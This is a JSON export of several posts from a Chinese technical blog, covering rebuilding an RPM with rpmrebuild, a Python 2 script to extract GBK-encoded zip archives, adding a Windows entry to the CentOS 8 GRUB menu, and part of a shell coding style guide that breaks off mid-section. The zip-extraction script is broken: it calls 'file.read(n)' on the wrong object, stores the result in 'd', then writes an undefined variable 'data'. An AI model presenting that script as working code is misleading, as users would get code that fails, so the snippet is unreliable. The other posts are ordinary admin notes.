9b54\u6539\u65b9\u5f0f","date":"2020-04-07T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"},{"inline":true,"label":"rpm","permalink":"/notes/blog/tags/rpm"},{"inline":true,"label":"rpmrebuild","permalink":"/notes/blog/tags/rpmrebuild"}],"readingTime":0.88,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528rpmrebuild\u4fee\u6539rpm\u5305\u5185\u5bb9","description":"\u4e00\u79cdrpm\u5305\u7684\u9b54\u6539\u65b9\u5f0f","categories":["shell"],"tags":["bash","rpm","rpmrebuild"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528conventional-changelog\u548cStrapdown.js\u4e3agit\u4ed3\u5e93\u81ea\u52a8\u751f\u6210changelog html\u9875\u9762","permalink":"/notes/blog/2021/01/15/auto-create-changelog-html"},"nextItem":{"title":"python\u811a\u672c\u89e3\u538bgbk\u7f16\u7801zip","permalink":"/notes/blog/2020/03/27/unzip-gbk-with-python"}},"content":"> \u67d0\u4e9b\u7279\u6b8a\u7d27\u6025\u60c5\u51b5\u4e0b... ...\\n\\n\\n\\n\u67d0\u4e9b\u7279\u6b8a\u7d27\u6025\u60c5\u51b5\u4e0b\u6ca1\u6cd5\u7b49\u5230\u91cd\u65b0\u4ece\u6e90\u7801\u7f16\u8bd1\u6253\u5305\uff0c\u624b\u91cc\u53ea\u6709\u4e00\u4e2a\u6253\u5305\u597d\u7684rpm\uff0c\u4f46\u662f\u91cc\u9762\u5185\u5bb9\u9700\u8981\u5728\u5b89\u88c5\u524d\u5c31\u6539\u6389\uff0c\u6bd4\u5982\u4fee\u6539\u67d0\u4e2a\u6587\u4ef6\u5185\u5bb9\u7b49\uff0c\u8fd9\u4e2a\u65f6\u5019rpmrebuild\u547d\u4ee4\u53ef\u4ee5\u6d3e\u4e0a\u7528\u573a\u3002\\nrpmrebuild\u5de5\u4f5c\u65f6\u4f1a\u628arpm\u5305\u5185\u5bb9\u91ca\u653e\u5230\u4e00\u4e2a\u4e34\u65f6\u76ee\u5f55\uff0c\u5982\u679c\u9700\u8981\u4fee\u6539rpm\u5305\u91cc\u9762\u7684\u6587\u4ef6\u7684\u8bdd\uff0c \u53ef\u4ee5\u901a\u8fc7-m\u53c2\u6570\u6307\u5b9a\u6267\u884c\u7684\u547d\u4ee4\uff0c\u6bd4\u5982/bin/bash\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684shell\uff0c\\n\u6709\u4e86\u4ea4\u4e92\u5f0fshell\u60f3\u8c61\u7a7a\u95f4\u5c31\u5f88\u5927\u4e86\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u4e2ashell\u73af\u5883\u4e0b\u5bf9rpm\u5305\u91ca\u653e\u51fa\u6765\u7684\u6587\u4ef6\u4efb\u610f\u4fee\u6539\uff0c\u5f53\u9000\u51fa\u8fd9\u4e2ashell\u65f6\uff0crpmrebuild\u4f1a\u628a\u6539\u52a8\u6253\u5305\u56de\u65b0\u7684rpm\u3002\\n\u4f8b\u5982\uff1a\\n```\\nrpmrebuild -m /bin/bash -np rpm/xxx.rpm\\n# \u6b64\u65f6\u6211\u4eec\u5f97\u5230\u4e00\u4e2a\u4ea4\u4e92shell\uff0c\\n# \u6bd4\u5982\u77e5\u9053\u9700\u8981\u4fee\u6539\u7684\u6587\u4ef6\u540d\u4e3aaaa\uff0c\u53ef\u4ee5\u8fd9\u6837\u64cd\u4f5c\uff1a\\nfind / -name aaa\\n# \u5c3d\u60c5\u53d1\u6325\u5427\uff0c\u5b8c\u4e86\u9000\u51fa\\nctrl+D\\n```\\n\u73b0\u5728\u4f60\u5c31\u5f97\u5230\u4fee\u6539\u597d\u5185\u5bb9\u4e4b\u540e\u7684\u65b0rpm\u4e86\u3002"},{"id":"/2020/03/27/unzip-gbk-with-python","metadata":{"permalink":"/notes/blog/2020/03/27/unzip-gbk-with-python","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2020-03-27-unzip-gbk-with-python.md","source":"@site/blog/2020-03-27-unzip-gbk-with-python.md","title":"python\u811a\u672c\u89e3\u538bgbk\u7f16\u7801zip","description":"","date":"2020-03-27T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"},{"inline":true,"label":"python","permalink":"/notes/blog/tags/python"}],"readingTime":0.43,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"python\u811a\u672c\u89e3\u538bgbk\u7f16\u7801zip","description":"","categories":["shell"],"tags":["bash","python"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528rpmrebuild\u4fee\u6539rpm\u5305\u5185\u5bb9","permalink":"/notes/blog/2020/04/07/change-rpm-file-using-rpmrebuild"},"nextItem":{"title":"CentOS8\u5b89\u88c5\u540egrub\u83dc\u5355\u589e\u52a0windows\u5165\u53e3","permalink":"/notes/blog/2020/03/12/centos8-bootmenu-add-windows"}},"content":"> \u7f16\u7801\u95ee\u9898\u5f88\u70e6\u4eba\\n\\n\\ngbk\u7f16\u7801\u7684zip\u5728linux\u4e0b\u89e3\u538b\u51fa\u6765\u6587\u4ef6\u540d\u4f1a\u4e71\u7801\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u811a\u672c\u89e3\u538b\u8fc7\u7a0b\u4e2d\u8f6c\u6362\u4e0b\\n\\n```\\n#!/usr/bin/env python2\\n# coding: utf-8\\n\\nimport os\\nimport sys\\nimport zipfile\\n\\nf = zipfile.ZipFile(sys.argv[1],\\"r\\");\\nfor n in f.namelist():\\n    try:\\n        u = n.decode(\\"gbk\\")\\n    except:\\n        u = n\\n    p = os.path.dirname(u)\\n    if not p:\\n        continue\\n    if not os.path.exists(p):\\n        os.makedirs(p)\\n    d = file.read(n)\\n    if os.path.exists(u):\\n        continue\\n    with open(u, \\"w\\") as o:\\n        o.write(data)\\n```"},{"id":"/2020/03/12/centos8-bootmenu-add-windows","metadata":{"permalink":"/notes/blog/2020/03/12/centos8-bootmenu-add-windows","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2020-03-12-centos8-bootmenu-add-windows.md","source":"@site/blog/2020-03-12-centos8-bootmenu-add-windows.md","title":"CentOS8\u5b89\u88c5\u540egrub\u83dc\u5355\u589e\u52a0windows\u5165\u53e3","description":"\u9ed8\u8ba4\u5b89\u88c5\u5b8c\u4e0d\u4f1a\u81ea\u52a8\u8bc6\u522b\u5176\u4ed6\u7cfb\u7edf\uff0c\u9700\u8981\u624b\u5de5\u6dfb\u52a0","date":"2020-03-12T00:00:00.000Z","tags":[{"inline":true,"label":"os","permalink":"/notes/blog/tags/os"},{"inline":true,"label":"centos","permalink":"/notes/blog/tags/centos"},{"inline":true,"label":"grub","permalink":"/notes/blog/tags/grub"},{"inline":true,"label":"centos8","permalink":"/notes/blog/tags/centos-8"}],"readingTime":1.13,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"CentOS8\u5b89\u88c5\u540egrub\u83dc\u5355\u589e\u52a0windows\u5165\u53e3","description":"\u9ed8\u8ba4\u5b89\u88c5\u5b8c\u4e0d\u4f1a\u81ea\u52a8\u8bc6\u522b\u5176\u4ed6\u7cfb\u7edf\uff0c\u9700\u8981\u624b\u5de5\u6dfb\u52a0","categories":["os"],"tags":["os","centos","grub","centos8"]},"unlisted":false,"prevItem":{"title":"python\u811a\u672c\u89e3\u538bgbk\u7f16\u7801zip","permalink":"/notes/blog/2020/03/27/unzip-gbk-with-python"},"nextItem":{"title":"shell style guide","permalink":"/notes/blog/2020/01/03/shell-standards"}},"content":"> \u7535\u8111\u53cc\u7cfb\u7edfcentos+windows\uff0c\u5b89\u88c5\u5b8ccentos8\u4e4b\u540e\u9ed8\u8ba4\u6ca1\u6709\u5f15\u5bfcwindows\u7684\u5165\u53e3\uff0c\u6309\u7167\u4e0b\u9762\u65b9\u6cd5\u624b\u6413\u5373\u53ef\u3002\\n\\n## 1 \u542f\u52a8\u8fdb\u5165centos\\n\u67e5\u770b\u78c1\u76d8\u5206\u533a\u4fe1\u606f\uff0c\u5982\u4e0b\uff1a\\n```fdisk -l```\\n\\n```\\n# fdisk -l\\nDisk /dev/sda: 238.5 GiB, 256060514304 bytes, 500118192 sectors\\nUnits: sectors of 1 * 512 = 512 bytes\\nSector size (logical/physical): 512 bytes / 512 bytes\\nI/O size (minimum/optimal): 512 bytes / 512 bytes\\nDisklabel type: dos\\nDisk identifier: 0x297f5cef\\n\\nDevice     Boot     Start       End   Sectors   Size Id Type\\n/dev/sda1  *         2048 250058751 250056704 119.2G  7 HPFS/NTFS/exFAT\\n/dev/sda2       250058752 393418751 143360000  68.4G  7 HPFS/NTFS/exFAT\\n/dev/sda3       393418752 394442751   1024000   500M 83 Linux\\n/dev/sda4       394442752 500117503 105674752  50.4G  5 Extended\\n/dev/sda5       394444800 500117503 105672704  50.4G 83 Linux\\n ```\\n\u901a\u8fc7fdisk\u7ed3\u679c\u770b\u5230windows\u7b2c\u4e00\u4e2apartion\u5728sda1\uff0c\u5bf9\u5e94grub\u7684\u78c1\u76d8\u7d22\u5f15\u7f16\u53f7\u662fhd0,1,\u63a5\u4e0b\u6765\u7f16\u8f91grub\u914d\u7f6e\u6587\u4ef6\uff0c\u81ea\u5b9a\u4e49\u914d\u7f6e\u8def\u5f84\uff1a\\n```\\n vi  /etc/grub.d/40_custom\\n```\\n\u914d\u7f6e\u793a\u4f8b\u5982\u4e0b\uff1a\\n```\\n #!/bin/sh\\n exec tail -n +3 $0\\n # This file provides an easy way to add custom menu entries.  Simply type the\\n # menu entries you want to add after this comment.  Be careful not to change\\n # the \'exec tail\' line above.\\n\\n menuentry \\"Windows\\" {\\n         set root=(hd0,1)\\n         chainloader +1\\n         }\\n```\\n\\n\u4fdd\u5b58\u5e76\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4f7f\u81ea\u5b9a\u4e49\u914d\u7f6e\u751f\u6548\uff1a\\n```\\ngrub2-mkconfig --output=/boot/grub2/grub.cfg\\n```\\nOVER."},{"id":"/2020/01/03/shell-standards","metadata":{"permalink":"/notes/blog/2020/01/03/shell-standards","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2020-01-03-shell-standards.md","source":"@site/blog/2020-01-03-shell-standards.md","title":"shell style guide","description":"","date":"2020-01-03T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":20.52,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"shell style guide","description":"","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"CentOS8\u5b89\u88c5\u540egrub\u83dc\u5355\u589e\u52a0windows\u5165\u53e3","permalink":"/notes/blog/2020/03/12/centos8-bootmenu-add-windows"},"nextItem":{"title":"HIVE\u4e2d\u5e38\u89c1\u7684\u5c0f\u6587\u4ef6\u5408\u5e76\u65b9\u6cd5","permalink":"/notes/blog/2019/09/02/hive-small-file"}},"content":"> \u8fd9\u91cc\u662f\u4e00\u53e5\u957f\u957f\u7684\u5f15\u8a00\\n\\n* Shell \u7f16\u7801\u89c4\u8303\\n\\n## \u524d\u8a00\\n\\n\u4e0e\u5176\u5b83\u7684\u7f16\u7a0b\u89c4\u8303\u4e00\u6837\uff0c\u8fd9\u91cc\u6240\u8ba8\u8bba\u7684\u4e0d\u4ec5\u4ec5\u662f\u7f16\u7801\u683c\u5f0f\u7f8e\u4e0d\u7f8e\u89c2\u7684\u95ee\u9898\uff0c \u540c\u65f6\u4e5f\u8ba8\u8bba\u4e00\u4e9b\u7ea6\u5b9a\u53ca\u7f16\u7801\u6807\u51c6\u3002\u8fd9\u4efd\u6587\u6863\u4e3b\u8981\u4fa7\u91cd\u4e8e\u6211\u4eec\u6240\u666e\u904d\u9075\u5faa\u7684\u89c4\u5219\uff0c \u5bf9\u4e8e\u90a3\u4e9b\u4e0d\u662f\u660e\u786e\u5f3a\u5236\u8981\u6c42\u7684\uff0c\u6211\u4eec\u5c3d\u91cf\u907f\u514d\u63d0\u4f9b\u610f\u89c1\u3002\\n\\n### \u4e3a\u4ec0\u4e48\u8981\u6709\u7f16\u7801\u89c4\u8303\\n\\n\u7f16\u7801\u89c4\u8303\u5bf9\u4e8e\u7a0b\u5e8f\u5458\u800c\u8a00\u5c24\u4e3a\u91cd\u8981\uff0c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u539f\u56e0\uff1a\\n- \u4e00\u4e2a\u8f6f\u4ef6\u7684\u751f\u547d\u5468\u671f\u4e2d\uff0c80%\u7684\u82b1\u8d39\u5728\u4e8e\u7ef4\u62a4\\n- \u51e0\u4e4e\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u8f6f\u4ef6\uff0c\u5728\u5176\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\uff0c\u5747\u7531\u6700\u521d\u7684\u5f00\u53d1\u4eba\u5458\u6765\u7ef4\u62a4\\n- \u7f16\u7801\u89c4\u8303\u53ef\u4ee5\u6539\u5584\u8f6f\u4ef6\u7684\u53ef\u8bfb\u6027\uff0c\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u5458\u5c3d\u5feb\u800c\u5f7b\u5e95\u5730\u7406\u89e3\u65b0\u7684\u4ee3\u7801\\n- \u5982\u679c\u4f60\u5c06\u6e90\u7801\u4f5c\u4e3a\u4ea7\u54c1\u53d1\u5e03\uff0c\u5c31\u9700\u8981\u786e\u4efb\u5b83\u662f\u5426\u88ab\u5f88\u597d\u7684\u6253\u5305\u5e76\u4e14\u6e05\u6670\u65e0\u8bef\uff0c\u4e00\u5982\u4f60\u5df2\u6784\u5efa\u7684\u5176\u5b83\u4efb\u4f55\u4ea7\u54c1\\n\\n### \u7f16\u7801\u89c4\u8303\u539f\u5219\\n\\n\u672c\u6587\u6863\u4e2d\u7684\u51c6\u5219\u81f4\u529b\u4e8e\u6700\u5927\u9650\u5ea6\u8fbe\u5230\u4ee5\u4e0b\u539f\u5219\uff1a\\n- \u6b63\u786e\u6027\\n- \u53ef\u8bfb\u6027\\n- \u53ef\u7ef4\u62a4\u6027\\n- \u53ef\u8c03\u8bd5\u6027\\n- \u4e00\u81f4\u6027\\n- \u7f8e\u89c2\\n\\n\u5c3d\u7ba1\u672c\u6587\u6863\u6db5\u76d6\u4e86\u8bb8\u591a\u57fa\u7840\u77e5\u8bc6\uff0c\u4f46\u5e94\u6ce8\u610f\u7684\u662f\uff0c\u6ca1\u6709\u7f16\u7801\u89c4\u8303\u53ef\u4ee5\u4e3a\u6211\u4eec\u56de\u7b54\u6240\u6709\u95ee\u9898\uff0c\u5f00\u53d1\u4eba\u5458\u59cb\u7ec8\u9700\u8981\u518d\u7f16\u5199\u5b8c\u4ee3\u7801\u540e\uff0c\u5bf9\u4e0a\u8ff0\u539f\u5219\u505a\u51fa\u6b63\u786e\u7684\u5224\u65ad\u3002\\n\\n### \u4ee3\u7801\u89c4\u8303\u7b49\u7ea7\u5b9a\u4e49\\n- **\u53ef\u9009\uff08Optional\uff09**\uff1a\u7528\u6237\u53ef\u53c2\u8003\uff0c\u81ea\u884c\u51b3\u5b9a\u662f\u5426\u91c7\u7528\uff1b\\n- **\u63a8\u8350\uff08Preferable\uff09**\uff1a\u7528\u6237\u7406\u5e94\u91c7\u7528\uff0c\u4f46\u5982\u6709\u7279\u6b8a\u60c5\u51b5\uff0c\u53ef\u4ee5\u4e0d\u91c7\u7528\uff1b\\n- **\u5fc5\u987b\uff08Mandatory\uff09**\uff1a\u7528\u6237\u5fc5\u987b\u91c7\u7528\uff08\u9664\u975e\u662f\u5c11\u6570\u975e\u5e38\u7279\u6b8a\u7684\u60c5\u51b5\uff0c\u624d\u80fd\u4e0d\u91c7\u7528\uff09\uff1b\\n\\n**\u6ce8\uff1a** \u672a\u660e\u786e\u6307\u660e\u7684\u5219\u9ed8\u8ba4\u4e3a **\u5fc5\u987b\uff08Mandatory\uff09**\\n\\n### \u672c\u6587\u6863\u53c2\u8003\\n\\n\u4e3b\u8981\u53c2\u8003\u5982\u4e0b\u6587\u6863:\\n- [Google Shell Style Guide](https://google.github.io/styleguide/shell.xml \\"Google Shell Style Guide\\")\\n- [Bash Hackers Wiki](https://wiki.bash-hackers.org/scripting/style \\"Scripting with style\\")\\n\\n\\n## \u6e90\u6587\u4ef6\\n### \u57fa\u7840\\n\\n#### \u4f7f\u7528\u573a\u666f\\n\\n\u4ec5\u5efa\u8baeShell\u7528\u4f5c\u76f8\u5bf9\u7b80\u5355\u7684\u5b9e\u7528\u5de5\u5177\u6216\u8005\u5305\u88c5\u811a\u672c\u3002\u56e0\u6b64\u5355\u4e2ashell\u811a\u672c\u5185\u5bb9\u4e0d\u5b9c\u592a\u8fc7\u590d\u6742\u3002\\n\\n\u5728\u9009\u62e9\u4f55\u65f6\u4f7f\u7528shell\u811a\u672c\u65f6\u65f6\u5e94\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a\\n\\n- \u5982\u4e3b\u8981\u7528\u4e8e\u8c03\u7528\u5176\u4ed6\u5de5\u5177\u4e14\u9700\u5904\u7406\u7684\u6570\u636e\u91cf\u8f83\u5c11\uff0c\u5219shell\u662f\u4e00\u4e2a\u9009\u62e9\\n- \u5982\u5bf9\u6027\u80fd\u5341\u5206\u654f\u611f\uff0c\u5219\u66f4\u63a8\u8350\u9009\u62e9\u5176\u4ed6\u8bed\u8a00\uff0c\u800c\u975eshell\\n- \u5982\u9700\u5904\u7406\u76f8\u5bf9\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5219\u66f4\u63a8\u8350\u9009\u62e9\u5176\u4ed6\u8bed\u8a00\uff0c\u800c\u975eshell\\n- \u5982\u811a\u672c\u5185\u5bb9\u9010\u6e10\u589e\u957f\u4e14\u6709\u53ef\u80fd\u51fa\u73b0\u7ee7\u7eed\u589e\u957f\u7684\u8d8b\u52bf\uff0c\u8bf7\u5c3d\u65e9\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u91cd\u5199\\n\\n#### \u6587\u4ef6\u540d\\n\\n\u53ef\u6267\u884c\u6587\u4ef6\u4e0d\u5efa\u8bae\u6709\u6269\u5c55\u540d\uff0c\u5e93\u6587\u4ef6\u5fc5\u987b\u4f7f\u7528 **.sh** \u4f5c\u4e3a\u6269\u5c55\u540d\uff0c\u4e14\u5e94\u662f\u4e0d\u53ef\u6267\u884c\u7684\u3002\\n\\n\u6267\u884c\u4e00\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u65e0\u9700\u77e5\u9053\u5176\u7f16\u5199\u8bed\u8a00\uff0c\u4e14shell\u811a\u672c\u5e76\u4e0d\u8981\u6c42\u5177\u6709\u6269\u5c55\u540d\uff0c\u6240\u4ee5\u66f4\u503e\u5411\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709\u6269\u5c55\u540d\u3002\\n\\n\u800c\u5e93\u6587\u4ef6\u77e5\u9053\u5176\u7f16\u5199\u8bed\u8a00\u5341\u5206\u91cd\u8981\uff0c\u4f7f\u7528 **.sh** \u4f5c\u4e3a\u7279\u5b9a\u8bed\u8a00\u540e\u7f00\u7684\u6269\u5c55\u540d\uff0c\u53ef\u4ee5\u548c\u5176\u4ed6\u8bed\u8a00\u7f16\u5199\u7684\u5e93\u6587\u4ef6\u52a0\u4ee5\u533a\u5206\u3002\\n\\n\u6587\u4ef6\u540d\u8981\u6c42\u5168\u90e8\u5c0f\u5199, \u53ef\u4ee5\u5305\u542b\u4e0b\u5212\u7ebf ```_``` \u6216\u8fde\u5b57\u7b26 ```-```, \u5efa\u8bae\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528\u8fde\u5b57\u7b26\uff0c\u5e93\u6587\u4ef6\u4f7f\u7528\u4e0b\u5212\u7ebf\u3002\\n\\n\u6b63\u4f8b:\\n```\\nmy-useful-bin\\nmy_useful_libraries.sh\\nmyusefullibraries.sh\\n```\\n\\n\u53cd\u4f8b\uff1a\\n```\\nMy_Useful_Bin\\nmyUsefulLibraries.sh\\n```\\n\\n#### \u6587\u4ef6\u7f16\u7801\\n\\n\u6e90\u6587\u4ef6\u7f16\u7801\u683c\u5f0f\u4e3a**UTF-8**\u3002\\n\u907f\u514d\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u6587\u4ef6\u6362\u884c\u5904\u7406\u7684\u65b9\u5f0f\u4e0d\u540c\uff0c\u4e00\u5f8b\u4f7f\u7528```LF```\u3002\\n\\n\\n#### \u5355\u884c\u957f\u5ea6\\n\\n\u6bcf\u884c\u6700\u591a\u4e0d\u8d85\u8fc7120\u4e2a\u5b57\u7b26\u3002\u6bcf\u884c\u4ee3\u7801\u6700\u5927\u957f\u5ea6\u9650\u5236\u7684\u6839\u672c\u539f\u56e0\u662f\u8fc7\u957f\u7684\u884c\u4f1a\u5bfc\u81f4\u9605\u8bfb\u969c\u788d\uff0c\u4f7f\u5f97\u7f29\u8fdb\u5931\u6548\u3002\\n\\n\u9664\u4e86\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u4f8b\u5916\uff1a\\n\\n- \u5bfc\u5165\u6a21\u5757\u8bed\u53e5\\n- \u6ce8\u91ca\u4e2d\u5305\u542b\u7684URL\\n\\n\u5982\u51fa\u73b0\u957f\u5ea6\u5fc5\u987b\u8d85\u8fc7120\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\uff0c\u5e94\u5c3d\u91cf\u4f7f\u7528here document\u6216\u8005\u5d4c\u5165\u7684\u6362\u884c\u7b26\u7b49\u5408\u9002\u7684\u65b9\u6cd5\u4f7f\u5176\u53d8\u77ed\u3002\\n\\n\u793a\u4f8b\uff1a\\n```\\n# DO use \'here document\'s\\ncat <<END;\\nI am an exceptionally long\\nstring.\\nEND\\n\\n# Embedded newlines are ok too\\nlong_string=\\"I am an exceptionally\\n  long string.\\"\\n```\\n\\n#### \u7a7a\u767d\u5b57\u7b26\\n\\n\u9664\u4e86\u5728\u884c\u7ed3\u675f\u4f7f\u7528\u6362\u884c\u7b26\uff0c\u7a7a\u683c\u662f\u6e90\u6587\u4ef6\u4e2d\u552f\u4e00\u5141\u8bb8\u51fa\u73b0\u7684\u7a7a\u767d\u5b57\u7b26\u3002\\n- \u5b57\u7b26\u4e32\u4e2d\u7684\u975e\u7a7a\u683c\u7a7a\u767d\u5b57\u7b26\uff0c\u4f7f\u7528\u8f6c\u4e49\u5b57\u7b26\\n- \u4e0d\u5141\u8bb8\u884c\u524d\u4f7f\u7528tab\u7f29\u8fdb\uff0c\u5982\u679c\u4f7f\u7528tab\u7f29\u8fdb\uff0c\u5fc5\u987b\u8bbe\u7f6e1\u4e2atab\u4e3a4\u4e2a\u7a7a\u683c\\n- \u4e0d\u5e94\u5728\u884c\u5c3e\u51fa\u73b0\u6ca1\u6709\u610f\u4e49\u7684\u7a7a\u767d\u5b57\u7b26\\n\\n\\n#### \u5783\u573e\u6e05\u7406<sup>  *\u63a8\u8350*  </sup>\\n\\n\u5bf9\u4ece\u6765\u6ca1\u6709\u7528\u5230\u7684\u6216\u8005\u88ab\u6ce8\u91ca\u7684\u65b9\u6cd5\u3001\u53d8\u91cf\u7b49\u8981\u575a\u51b3\u4ece\u4ee3\u7801\u4e2d\u6e05\u7406\u51fa\u53bb\uff0c\u907f\u514d\u8fc7\u591a\u5783\u573e\u9020\u6210\u5e72\u6270\u3002\\n\\n\\n### \u7ed3\u6784\\n\\n#### \u4f7f\u7528bash\\nBash \u662f\u552f\u4e00\u88ab\u5141\u8bb8\u4f7f\u7528\u7684\u53ef\u6267\u884c\u811a\u672cshell\u3002\\n\\n\u53ef\u6267\u884c\u6587\u4ef6\u5fc5\u987b\u4ee5 ```#!/bin/bash``` \u5f00\u59cb\u3002\u8bf7\u4f7f\u7528 ```set``` \u6765\u8bbe\u7f6eshell\u7684\u9009\u9879\uff0c\u4f7f\u5f97\u7528 ```bash <script_name>``` \u8c03\u7528\u4f60\u7684\u811a\u672c\u65f6\u4e0d\u4f1a\u7834\u574f\u5176\u529f\u80fd\u3002\\n\\n\u9650\u5236\u6240\u6709\u7684\u53ef\u6267\u884cshell\u811a\u672c\u4e3abash\u4f7f\u5f97\u6211\u4eec\u5b89\u88c5\u5728\u6240\u6709\u8ba1\u7b97\u673a\u4e2d\u7684shell\u8bed\u8a00\u4fdd\u6301\u4e00\u81f4\u6027\u3002\\n\u6b63\u4f8b\uff1a\\n```\\n#!/bin/bash\\nset -e\\n```\\n\\n\u53cd\u4f8b\uff1a\\n```\\n#!/bin/sh -e\\n```\\n\\n\\n#### \u8bb8\u53ef\u8bc1\u6216\u7248\u6743\u4fe1\u606f<sup>  *\u63a8\u8350*  </sup>\\n\\n\u8bb8\u53ef\u8bc1\u4e0e\u7248\u6743\u4fe1\u606f\u9700\u653e\u5728\u6e90\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\u4f8b\u5982\uff1a\\n```\\n#\\n# Licensed under the BSD 3-Clause License (the \\"License\\"); you may not use this file except\\n# in compliance with the License. You may obtain a copy of the License at\\n#\\n# https://opensource.org/licenses/BSD-3-Clause\\n#\\n# Unless required by applicable law or agreed to in writing, software distributed\\n# under the License is distributed on an \\"AS IS\\" BASIS, WITHOUT WARRANTIES OR\\n# CONDITIONS OF ANY KIND, either express or implied. See the License for the\\n# specific language governing permissions and limitations under the License.\\n#\\n\\n```\\n\\n#### \u7f29\u8fdb\\n##### \u5757\u7f29\u8fdb\\n\\n\u6bcf\u5f53\u5f00\u59cb\u4e00\u4e2a\u65b0\u7684\u5757\uff0c\u7f29\u8fdb\u589e\u52a04\u4e2a\u7a7a\u683c\uff08\u4e0d\u80fd\u4f7f\u7528\\\\t\u5b57\u7b26\u6765\u7f29\u8fdb\uff09\u3002\u5f53\u5757\u7ed3\u675f\u65f6\uff0c\u7f29\u8fdb\u8fd4\u56de\u5148\u524d\u7684\u7f29\u8fdb\u7ea7\u522b\u3002\u7f29\u8fdb\u7ea7\u522b\u9002\u7528\u4e8e\u4ee3\u7801\u548c\u6ce8\u91ca\u3002\\n\\n```\\nmain() {\\n    # \u7f29\u8fdb4\u4e2a\u7a7a\u683c\\n    say=\\"hello\\"\\n    flag=0\\n    if [[ $flag = 0 ]]; then\\n        # \u7f29\u8fdb4\u4e2a\u7a7a\u683c\\n        echo \\"$say\\"\\n    fi\\n```\\n\\n##### \u7ba1\u9053\\n\\n\u5982\u679c\u4e00\u884c\u5bb9\u4e0d\u4e0b\u6574\u4e2a\u7ba1\u9053\u64cd\u4f5c\uff0c\u90a3\u4e48\u8bf7\u5c06\u6574\u4e2a\u7ba1\u9053\u64cd\u4f5c\u5206\u5272\u6210\u6bcf\u884c\u4e00\u4e2a\u7ba1\u6bb5\u3002\\n\\n\u5982\u679c\u4e00\u884c\u5bb9\u5f97\u4e0b\u6574\u4e2a\u7ba1\u9053\u64cd\u4f5c\uff0c\u90a3\u4e48\u8bf7\u5c06\u6574\u4e2a\u7ba1\u9053\u64cd\u4f5c\u5199\u5728\u540c\u4e00\u884c\uff0c\u7ba1\u9053\u5de6\u53f3\u5e94\u6709\u7a7a\u683c\u3002\\n\\n\u5426\u5219\uff0c\u5e94\u8be5\u5c06\u6574\u4e2a\u7ba1\u9053\u64cd\u4f5c\u5206\u5272\u6210\u6bcf\u884c\u4e00\u6bb5\uff0c\u7ba1\u9053\u64cd\u4f5c\u7684\u4e0b\u4e00\u90e8\u5206\u5e94\u8be5\u5c06\u7ba1\u9053\u7b26\u653e\u5728\u65b0\u884c\u5e76\u4e14\u7f29\u8fdb4\u4e2a\u7a7a\u683c\u3002\u8fd9\u9002\u7528\u4e8e\u7ba1\u9053\u7b26 ```|``` \u4ee5\u53ca\u903b\u8f91\u8fd0\u7b97 ```||``` \u548c ```&&``` \u3002\\n\u6b63\u4f8b\uff1a\\n```\\n# \u5355\u884c\u7ba1\u9053\u8fde\u63a5\uff0c\u7ba1\u9053\u5de6\u53f3\u7a7a\u683c\\ncommand1 | command2\\n\\n# \u957f\u547d\u4ee4\u7ba1\u9053\u6362\u884c\u8fde\u63a5\uff0c\u7ba1\u9053\u653e\u7f6e\u4e8e\u4e0b\u4e00\u4e2a\u547d\u4ee4\u5f00\u5934\uff0c\u7f29\u8fdb4\u4e2a\u7a7a\u683c\\ncommand1 \\\\\\n    | command2 \\\\\\n    | command3 \\\\\\n    | command4\\n```\\n\u53cd\u4f8b\uff1a\\n```\\n# \u7ba1\u9053\u5de6\u53f3\u65e0\u7a7a\u683c\\ncommand1|command2\\n\\n# \u6362\u884c\u8fde\u63a5\u7ba1\u9053\u653e\u7f6e\u4e8e\u884c\u672b\\ncommand1 | \\\\\\n    command2 | \\\\\\n    command3 | \\\\\\n    command4\\n```\\n\\n##### \u5faa\u73af\\n\\n\u8bf7\u5c06 ```; do``` , ```; then``` \u548c ```while``` , ```for``` , ```if``` \u653e\u5728\u540c\u4e00\u884c\u3002\\n\\nshell\u4e2d\u7684\u5faa\u73af\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u662f\u6211\u4eec\u9075\u5faa\u8ddf\u58f0\u660e\u51fd\u6570\u65f6\u7684\u5927\u62ec\u53f7\u76f8\u540c\u7684\u539f\u5219\u3002\u5373\uff1a\\n```; do``` , ```; then``` \u5e94\u8be5\u548c while/for/if \u653e\u5728\u540c\u4e00\u884c\u3002\\nelse 